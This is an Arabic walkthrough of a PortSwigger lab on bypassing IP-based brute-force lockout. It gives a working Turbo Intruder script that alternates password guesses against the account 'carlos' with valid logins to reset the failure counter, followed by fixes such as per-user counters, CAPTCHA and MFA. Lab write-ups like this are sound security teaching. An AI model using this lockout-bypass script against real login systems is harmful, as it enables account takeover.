# [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)

## **`الهدف`**
القيام بعمل `brute-force` علي كلمة المرور الخاصة بحساب `carlos` باستخدام قائمة كلمات المرور التي يوفرها موقع الـ `PortSwigger` وتسجيل الدخول بنجاح إلى حسابه.
## **`خطوات الحل`**
==**`ملاحظة:`==** خطوات الحل الرسمي من الـ `PortSwigger` تختلف قليلًا عن الخطوات المكتوبة هنا لأنه يستعمل أداة `Burp Intruder`.

سنقوم  بتسجيل الدخول إلى حساب `carlos` وأي كلمة مرور عشوائية واعتراض الـ `request`
```http
POST /login HTTP/2
Host: 0a01008704c7959e834a50bc004e00f9.web-security-academy.net
Cookie: session=3gUgdZUDP0TVusOAPCalObMzVgYKQpXE

username=carlos&password=1234
```

ونقوم بإضافة علامة `%s` في خانة كلمة المرور بدلًا من `1234`

ولكن في هذا اللاب يتم عمل حظر لمدة `60` ثانية بعد كل محاولتين خاطئتين وتحتاج إلى الدخول إلى حساب بنجاح لإزالة الحظر لذلك سنحتاج لعمل سكريبت بايثون لأداة `Turbo Intruder` تقوم بعمل تسجيل دخول ناجح لحساب `wiener:peter` الذي أعطانا إياه اللاب
ويجب أن يكون بالتوازي، بمعنى أن السكريبت يقوم بتجربه إحدى كلمات المرور على حساب `carlos` والمرة التي تليها يقوم بتسجيل دخول صحيح إلى `wiener:peter` وبهذا لن نصل إلى محاولتين متتاليتين خاطئتين، فلن يتم حظر الـ `IP` وسيستمر السكريبت فى العمل.

```python
def queueRequests(target, wordlists):
    # إعداد المحرك كما كنتَ تستخدمه
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=2,
                           requestsPerConnection=10,
                           pipeline=False,
                           engine=Engine.THREADED)

    # --- الإعداد لطلب إعادة الضبط (wiener:peter) ---
    # نأخذ قالب الطلب الأساسي (target.req) ونعدّل فيه اسم المستخدم وكلمة المرور
    # افترض أن جسم الطلب فيه مثلاً: username=carlos&password=%s
    # سنصنع نسخة صالحة لـ wiener
    reset_req = target.req.replace('carlos', 'wiener')  # تغيير اسم المستخدم
    reset_req = reset_req.replace('%s', 'peter')        # تثبيت كلمة مرور wiener
    # تنبيه: لو القالب كان يستخدم اسم المستخدم كـ carlos داخل جسم الطلب فقط، فهذا يكفي.
    # إذا كان اسم المستخدم أيضاً في مسار URL أو مكان آخر، يجب تعديله حسب الحاجة.

    # نقرأ قائمة كلمات المرور من الملف
    with open(r'C:\Users\test\Desktop\password.txt', 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]

    # إرسال الطلب الصحيح لحساب wiener:peter كل 1 محاولة (يمكنك تغيير رقم reset_every)
    reset_every = 1
    for idx, pwd in enumerate(passwords):
        # قبل كل مجموعة من reset_every محاولات (عدا أول مرة ممكن نبدأ مباشرة)
        # نرسل طلب إعادة الضبط إذا كان idx من مضاعفات reset_every (و idx > 0 اختياري)
        if idx % reset_every == 0:
            engine.queue(reset_req)   # تسجيل دخول صحيح wiener:peter

        # الآن نرسل محاولة التخمين لـ carlos
        engine.queue(target.req, pwd)


def handleResponse(req, interesting):
    table.add(req)
```

وبملاحظة النتائج، سنجد أنه باستثناء محاولات الدخول بحساب `wiener:peter` فإن مع حساب `carlos` كلمة مرور `iloveyou` هي الوحيدة المُختلفة والتي قد عادت برقم `302` في خانة الـ `Status code` وهذا يعنى أنها ناجحة عكس البقية الذين كانوا برقم `200`.

لذلك نقوم بالعودة إلى اللاب وتسجيل الدخول إلى حساب `carlos:iloveyou` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب تغيير النظام الذي يحسب عدد المحاولات الخاطئة بحيث لا يتأثر بحسابات أخرى، فيتم ربط عدد المحاولات الفاشلة باسم المستخدم بالإضافة إلى الـ `IP`، وعندما ينجح تسجيل الدخول لحساب `wiener`، يجب أن يقوم النظام بتصفير العداد الخاص بحساب `wiener` فقط. لا ينبغي أبدًا أن يؤدي نجاح الدخول لحساب `wiener` إلى تصفير العداد الخاص بحساب `carlos` أو العداد العام للـ `IP`.

ويجب أن يكون حظر الـ `IP` أكثر صرامة، بحيث يجب أن يعتمد حظر الـ `IP` على إجمالي المحاولات الفاشلة الصادرة منه خلال إطار زمني محدد (مثلاً 5 محاولات فاشلة خلال دقيقة)، ولا يجب أن يتم مسح هذا السجل أو تصفيره لمجرد تخلل هذه الفترة محاولة دخول ناجحة لحساب آخر.

ويجب أن يُطلب من المستخدم حل كابتشا `(CAPTCHA)` بعد كل محاولتين أو ثلاث خطأ لإثبات أنه إنسان وليس اداة.

ويجب إضافة المصادقة الثنائية `Multi-Factor Authentication - MFA` حتى لا يستطيع المهاجم الدخول إلى الحساب حتى بعد معرفة اسم المستخدم وكلمة المرور.
